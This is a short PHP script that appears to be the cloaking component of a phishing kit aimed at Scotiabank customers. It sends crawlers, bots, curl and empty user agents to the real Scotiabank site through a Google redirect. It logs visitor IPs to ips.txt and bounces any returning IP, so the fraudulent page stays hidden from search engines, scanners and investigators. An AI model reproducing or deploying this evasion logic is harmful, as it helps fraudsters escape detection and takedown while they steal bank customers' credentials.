<?php


if (!empty($_SERVER['HTTP_CLIENT_IP']))  
    {

      $vis_ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   
    {
      $vis_ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
      $vis_ip=$_SERVER['REMOTE_ADDR'];
    }


$agent = $_SERVER['HTTP_USER_AGENT'];


if(preg_match('/bot|yahoo|google|spider|crawler|curl|^$/i', $agent))
{
	header("Location: https://www.google.cz/url?sa=t&rct=j&q=&esrc=s&source=web&cd=2&ved=2ahUKEwibotHkicHeAhWC1iwKHadfAwwQFjABegQIBxAB&url=https%3A%2F%2Fwww.scotiabank.com%2Fca%2Fen%2F0%2C%2C2%2C00.html&usg=AOvVaw1lD8_4_Gof3NtGofIcqiQO");
	die();
}

$data   = file_get_contents('ips.txt'); 


if (strpos($data, "\r\n") !== false) {
    $data   = explode("\r\n", $data);
}
else
{
$data   = explode("\n", $data);
}




if (in_array($vis_ip,$data))
{ echo '<script>window.location.assign("https://www.google.cz/url?sa=t&rct=j&q=&esrc=s&source=web&cd=2&ved=2ahUKEwibotHkicHeAhWC1iwKHadfAwwQFjABegQIBxAB&url=https%3A%2F%2Fwww.scotiabank.com%2Fca%2Fen%2F0%2C%2C2%2C00.html&usg=AOvVaw1lD8_4_Gof3NtGofIcqiQO")</script>';

$file=fopen("ips.txt","a+"); 
          fwrite($file,$vis_ip."\r\n");
fclose($file); 
die();
}
$file=fopen("ips.txt","a+"); 
          fwrite($file,$vis_ip."\r\n");
fclose($file); 







?>